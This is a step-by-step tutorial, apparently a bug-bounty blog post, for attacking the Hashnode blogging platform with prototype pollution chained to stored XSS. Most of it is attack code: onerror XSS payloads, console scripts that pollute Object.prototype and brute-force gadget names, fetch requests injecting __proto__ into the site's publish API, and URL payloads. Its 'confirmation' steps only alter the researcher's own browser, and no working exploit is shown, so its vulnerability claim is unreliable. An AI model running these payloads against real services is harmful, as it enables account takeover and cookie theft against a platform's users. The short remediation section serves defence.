# Prototype Pollution to Stored XSS on Hashnode — Step-by-Step Bug Discovery Using Browser Console

**Researcher:** MD Mehedi Hasan (SecurityTalent)

---

## Introduction

Prototype Pollution is a JavaScript vulnerability where an attacker injects properties into `Object.prototype`, affecting all objects in the runtime. When chained with a **gadget** (a property that reaches a dangerous sink like `innerHTML`), it becomes **Stored DOM XSS** — affecting every visitor to the compromised page.

However, **not every application reads `innerHTML` from plain objects**. Hashnode is built on Next.js (React), which uses a virtual DOM — it rarely reads `obj.innerHTML` from a configuration object. This means we need to:

1. **Confirm prototype pollution is possible** ✅
2. **Find the actual gadget** — what property does Hashnode read from objects that reaches the DOM? (the real challenge)
3. **Chain them together** for stored XSS

In this guide, I'll show you how to discover the correct gadget and confirm it step-by-step using nothing but the browser's DevTools Console.

---

## The Payloads

### Payload 1 — Basic XSS (alert box)
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(12)>"}}');
```

### Payload 2 — String.fromCharCode bypass (evades WAFs)
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100))>"}}');
```

### Payload 3 — Cookie exfiltration
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(67,111,111,107,105,101,115,58,32)+document.cookie)>"}}');
```

### Payload 4 — defaultView gadget (jQuery-based)
```javascript
const payload = JSON.parse('{"__proto__":{"defaultView":"<img src=x onerror=alert(1)>"}}');
```

### Payload 5 — jQuery context gadget
```javascript
const payload = JSON.parse('{"__proto__":{"context":"<img src=x onerror=alert(12)>"}}');
```

### Payload 6 — srcdoc gadget (iframe override)
```javascript
const payload = JSON.parse('{"__proto__":{"srcdoc":"<img src=x onerror=alert(12)>"}}');
```

---

## Prerequisites

- **Authorization** ✅ (Pre-verified by platform)
- **Browser** — Chrome/Edge DevTools (F12)
- **Target** — Hashnode blog editor

---

## Step 1: Confirm Prototype Pollution Works

Open the Hashnode blog editor and run:

```javascript
// Check baseline — these should be undefined
console.log('=== BASELINE CHECK ===');
console.table({
    innerHTML: ({}).innerHTML,
    srcdoc: ({}).srcdoc,
    defaultView: ({}).defaultView,
    context: ({}).context
});
```

Now pollute `Object.prototype`:

```javascript
Object.prototype.testPollution = "CONFIRMED_" + Date.now();
```

Verify:

```javascript
console.log('Pollution test:', ({}).testPollution);
// Expected: "CONFIRMED_..."
```

If this works, you have prototype pollution capability. ✅

---

## Step 2: Verify Direct DOM Injection Works

Let's confirm the environment allows XSS at all:

```javascript
// This proves inline event handlers are NOT blocked by CSP
document.body.innerHTML += '<img src=x onerror="alert(\'Direct DOM XSS Works!\')">';
```

✅ If this fires an alert, CSP is not blocking us.

❌ If it doesn't fire, check CSP headers or try a different event handler.

---


## POC

<video controls width="800">
  <source src="./POC/hashnode-poc.mp4" type="video/mp4">
</video>


## Step 3: The Gadget Problem — Explained

When you do:

```javascript
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
```

You're placing `innerHTML` on `Object.prototype`. For XSS to fire, some code in the application must do something like:

```javascript
// The app reads a property from some config object
let config = { title: "My Post" };

// If config.template is undefined, it falls through to Object.prototype
element.innerHTML = config.template;
```

But Hashnode's React-based code does NOT read `innerHTML` from a plain config object. React uses the virtual DOM — it creates elements programmatically. The property name must **match exactly** what the application code reads.

---

## Step 4: Find the Real Gadget — Intercept All innerHTML Writes

We need to see **every** time `innerHTML` is assigned to a DOM element, and check if it originated from prototype pollution:

```javascript
console.log('=== GADGET FINDER v2 ===');

// Intercept ALL innerHTML assignments on DOM elements
const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
if (desc && desc.set) {
    const origSet = desc.set;
    Object.defineProperty(Element.prototype, 'innerHTML', {
        set: function(value) {
            if (typeof value === 'string' && value.length > 10) {
                console.log('[innerHTML SET]', {
                    element: this.tagName + (this.id ? '#' + this.id : '') + (this.className ? '.' + this.className : ''),
                    valuePreview: value.substring(0, 120)
                });
                // Check if this came from prototype pollution
                if (value.includes('<img') || value.includes('onerror') || value.includes('<script')) {
                    console.warn('⚠️ POTENTIAL XSS-ORIGIN innerHTML!');
                    console.trace();
                    debugger;  // Pause here to inspect the call stack
                }
            }
            return origSet.call(this, value);
        },
        get: function() {
            return desc.get.call(this);
        }
    });
    console.log('✅ Interceptor installed on Element.prototype.innerHTML');
} else {
    console.log('❌ Could not find innerHTML descriptor');
}

// Now pollute with a unique marker
const marker = 'PP_TEST_' + Date.now();
Object.prototype.innerHTML = '<img src=x onerror="console.log(\'' + marker + '\')">';

console.log('🔄 Now interact with the page:');
console.log('   - Type in the editor');
console.log('   - Click Preview');
console.log('   - Click Publish/Save');
console.log('Watch the console for [innerHTML SET] logs and stack traces.');
```

Run this and interact with the page. If any `innerHTML` assignment contains your polluted value, the console will show it with a full stack trace.

---

## Step 5: Brute-Force All Possible Gadget Properties

Since we don't know the exact property name Hashnode reads, test ALL common candidates:

```javascript
console.log('=== BRUTE FORCE GADGET DISCOVERY ===');

const gadgetCandidates = [
    // DOM element properties
    'innerHTML', 'outerHTML', 'textContent', 'innerText', 'srcdoc',
    
    // jQuery/legacy
    'context', 'defaultView', 'html', 'text',
    
    // Common config/options properties
    'content', 'body', 'markup', 'template', 'value', 'data',
    'source', 'code', 'raw', 'htmlContent', 'renderedContent',
    'contentHtml', 'bodyHtml', 'description', 'excerpt',
    
    // React-specific
    'dangerouslySetInnerHTML', '__html', 'children',
    
    // Hashnode-specific (educated guesses)
    'contentMarkdown', 'contentHtml', 'coverImage', 'brief',
    'title', 'subtitle', 'slug', 'tags', 'editorContent',
    'previewContent', 'renderedHtml', 'markdown', 'htmlOutput',
    'sanitizedHtml', 'bodyContent',
    
    // DOMPurify bypass (CVE-2026-41238)
    'tagNameCheck', 'attributeNameCheck'
];

// Set ALL candidates on Object.prototype at once
gadgetCandidates.forEach(prop => {
    Object.prototype[prop] = '<img src=x onerror="console.log(\'🔥 GADGET_TRIGGERED: ' + prop + '\')">';
});

console.log('✅ All ' + gadgetCandidates.length + ' candidate gadgets set.');
console.log('🔄 Now interact with the page — type, preview, publish.');
console.log('   Watch for "🔥 GADGET_TRIGGERED: [propertyName]" messages.');
console.log('');

// Provide clear instructions
console.log('If you see a message like:');
console.log('   🔥 GADGET_TRIGGERED: contentHtml');
console.log('Then "contentHtml" is YOUR gadget!');
console.log('');

// Auto-cleanup after 60 seconds
setTimeout(() => {
    console.log('Cleaning up gadget candidates...');
    gadgetCandidates.forEach(prop => {
        try { delete Object.prototype[prop]; } catch(e) {}
    });
    console.log('Cleanup complete.');
}, 60000);
```

**Which one fires?** That's your confirmed gadget for Hashnode.

---

## Step 6: The Real Attack Vector — API-Level Testing

Client-side prototype pollution (setting `Object.prototype.innerHTML` in your own console) only affects **your browser session**. For **stored XSS** that affects all visitors, you need to find the **server-side merge operation**.

### Intercept the API Request

1. Open **Network tab** (F12 → Network)
2. Write a blog post
3. Click "Publish" or "Save Draft"
4. Find the POST/PUT request to Hashnode's API
5. Right-click → **Copy as fetch**

### Test Server-Side Prototype Pollution

```javascript
// Use the copied URL from the Network tab
const apiUrl = '/api/blog/publish';  // Replace with actual endpoint

// Test 1: __proto__ in JSON body
fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        title: "Test Post",
        content: "Hello world",
        __proto__: {
            innerHTML: "<img src=x onerror=alert(1)>"
        }
    })
});

// Test 2: constructor.prototype path
fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        title: "Test Post",
        content: "Hello world",
        constructor: {
            prototype: {
                innerHTML: "<img src=x onerror=alert(1)>"
            }
        }
    })
});

// Test 3: Nested __proto__ in content fields
fetch(apiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        title: "Test Post",
        content: JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'),
        __proto__: {
            innerHTML: "<img src=x onerror=alert(1)>"
        }
    })
});
```

### URL-Based Pollution (Reflected)

Sometimes the pollution vector is through URL parameters:

```
https://hashnode.com/post/new?__proto__[innerHTML]=<img%20src=x%20onerror=alert(1)>
https://hashnode.com/post/new?constructor[prototype][innerHTML]=<img%20src=x%20onerror=alert(1)>
```

---

## Step 7: Full Reconnaissance Script

Run this comprehensive script and screenshot the results:

```javascript
console.log('=== PROTOTYPE POLLUTION RECON ===');
console.log('Researcher: MD Mehedi Hasan (SecurityTalent)');
console.log('Target: Hashnode Blog Platform');
console.log('');

// 1. Check baseline
console.log('[1] Checking baseline state...');
const baseline = {};
['innerHTML', 'srcdoc', 'defaultView', 'context', 'html', 'content', 'body', 'text'].forEach(c => baseline[c] = ({})[c]);
console.table(baseline);

// 2. Confirm pollution works
console.log('');
console.log('[2] Confirming pollution capability...');
Object.prototype.__recon_test__ = 'POLLUTED_' + Date.now();
console.log('Pollution confirmed:', ({}).__recon_test__);
delete Object.prototype.__recon_test__;

// 3. Test CSP
console.log('');
console.log('[3] Testing CSP restrictions...');
try {
    document.body.innerHTML += '<img src=x onerror=alert("CSP_TEST")>';
    console.log('✅ Inline event handlers: ALLOWED');
    document.querySelectorAll('img[src="x"]').forEach(el => el.remove());
} catch(e) {
    console.log('❌ CSP may be blocking inline handlers');
}

// 4. Check for vulnerable libraries
console.log('');
console.log('[4] Library detection...');
console.log('jQuery:', typeof window.$);
console.log('lodash:', typeof window._);
console.log('_.merge:', typeof window._?.merge);
console.log('$.extend:', typeof window.$?.extend);

// 5. Framework detection
console.log('');
console.log('[5] Framework detection...');
console.log('Next.js root:', !!document.getElementById('__next'));
console.log('React root:', !!document.querySelector('[data-reactroot]'));

// 6. API interceptor
console.log('');
console.log('[6] API call interceptor active...');
const origFetch = window.fetch;
window.fetch = function(...args) {
    if (args[0] && typeof args[0] === 'string' && args[0].includes('/api/')) {
        console.log('[API CALL]', args[0]);
        if (args[1] && args[1].body) {
            try {
                const bodyStr = typeof args[1].body === 'string' ? args[1].body : '';
                if (bodyStr.includes('__proto__') || bodyStr.includes('constructor.prototype')) {
                    console.warn('⚠️ POLLUTION PAYLOAD IN API CALL!');
                    console.log('Body:', bodyStr);
                }
            } catch(e) {}
        }
    }
    return origFetch.apply(this, args);
};

// 7. Set all gadgets and wait
console.log('');
console.log('[7] Setting all gadget candidates...');
const allGadgets = ['innerHTML', 'srcdoc', 'defaultView', 'context', 'html', 'content', 'body', 'text', 'markup', 'template', 'value', 'outerHTML', 'textContent', 'innerText', 'contentHtml', 'bodyHtml', 'renderedContent', 'htmlContent', '__html', 'children', 'coverImage', 'brief', 'title', 'subtitle', 'contentMarkdown', 'renderedHtml'];
allGadgets.forEach(p => {
    Object.prototype[p] = '<img src=x onerror="console.log(\'🔥 GADGET: ' + p + '\')">';
});
console.log('✅ ' + allGadgets.length + ' gadgets set. Interact with the page now.');

console.log('');
console.log('=== RECON COMPLETE ===');
console.log('Interact with editor, then check console for GADGET_TRIGGERED messages.');
```

---

## How JSON.parse Enables This

When `JSON.parse('{"__proto__":{"innerHTML":"..."}}')` runs, `__proto__` is treated as a **regular property key** (not the special accessor). The parsed object has an own property called `__proto__` containing `{innerHTML: "..."}`.

When the application later merges this object into another using a recursive merge function (like `_.merge()`, `Object.assign()`, or spread operator), the merge iterates the keys and does:

```javascript
target["__proto__"]["innerHTML"] = "..."
```

Since `__proto__` on `target` is actually a getter/setter that accesses `Object.prototype`, this effectively runs:

```javascript
Object.prototype.innerHTML = "..."
```

**Every object in the page now inherits `.innerHTML`** — including any configuration or options object that the application later reads.

---

## Impact

| Impact | Description |
|--------|-------------|
| **Session Hijacking** | `document.cookie` exfiltration to attacker server |
| **Account Takeover** | Stolen auth tokens combined with CSRF |
| **Arbitrary JS Execution** | `fetch()` to exfiltrate data, keylogging, DOM manipulation |
| **Global Propagation** | Every visitor to the compromised post is affected |

---

## Remediation

```javascript
// 1. Block dangerous keys at input layer
function sanitizeKeys(obj) {
    const blocked = new Set(['__proto__', 'constructor', 'prototype']);
    for (let key in obj) {
        if (blocked.has(key)) delete obj[key];
        else if (typeof obj[key] === 'object') sanitizeKeys(obj[key]);
    }
    return obj;
}

// 2. Use prototype-free objects for config
const config = Object.create(null);
// config.__proto__ is undefined — no prototype chain to pollute

// 3. Sanitize HTML before DOM insertion
const safe = DOMPurify.sanitize(userInput);
element.innerHTML = safe;  // Only if absolutely necessary

// 4. Prefer textContent over innerHTML
element.textContent = userInput;  // Safe by default

// 5. Implement strict CSP
// Content-Security-Policy: default-src 'self';
// script-src 'nonce-{random}' 'strict-dynamic';
```

---

## Debugging: Why Alert Might Not Fire

```javascript
console.log('=== DIAGNOSTIC ===');

// 1. Is pollution actually working?
Object.prototype.innerHTML = "<img src=x onerror=alert(12)>";
console.log('Pollution confirmed:', ({}).innerHTML);

// 2. Does innerHTML assignment work at all?
document.body.innerHTML += '<img src=x onerror="alert(\'Direct innerHTML works!\')">';

// 3. Is the issue that the app never reads innerHTML from objects?
console.log('Hashnode uses React (Next.js).');
console.log('React does NOT read obj.innerHTML from config objects.');
console.log('You need to find the property the app DOES read.');

// 4. Check DOMPurify
document.querySelectorAll('script').forEach(s => {
    if (s.src && s.src.toLowerCase().includes('purify')) {
        console.log('DOMPurify detected:', s.src);
    }
});

// 5. Check if Object.prototype is frozen
console.log('Object.prototype extensible?', Object.isExtensible(Object.prototype));
console.log('Object.prototype frozen?', Object.isFrozen(Object.prototype));
```

---

## Conclusion

Prototype Pollution to Stored XSS is a critical vulnerability chain because:

1. **Server-side storage** — one injection affects every visitor
2. **Global pollution** — `Object.prototype` modification persists for the entire page lifetime
3. **Hard to detect** — standard XSS scanners won't find prototype pollution sinks
4. **Gadget-dependent** — the correct property name varies per application

**The key steps are:**
1. ✅ Confirm pollution works (`Object.prototype.test = "yes"`)
2. ✅ Confirm XSS works (`document.body.innerHTML += ...`)
3. ❓ Find the gadget — what property does the app read from objects into the DOM?
4. ❓ Chain them — pollute that specific property
5. ❓ For stored XSS — find the server-side merge operation

**The `innerHTML` gadget only works if the application code explicitly reads `obj.innerHTML` from a plain object and assigns it to an element's `.innerHTML`.** For React apps like Hashnode, you need to find the actual property name that the framework reads (e.g., `contentHtml`, `renderedContent`, `__html`, etc.).

---

## References

- [Prototype Pollution — PortSwigger Research](https://portswigger.net/web-security/prototype-pollution)
- [OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [MDN: Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype)

---

## About the Author

**MD Mehedi Hasan (SecurityTalent)**  
Bug bounty hunter and security researcher specializing in prototype pollution, XSS, and client-side attacks.

Tags: `#prototype-pollution` `#xss` `#dom-xss` `#bug-bounty` `#security` `#javascript` `#hashnode`


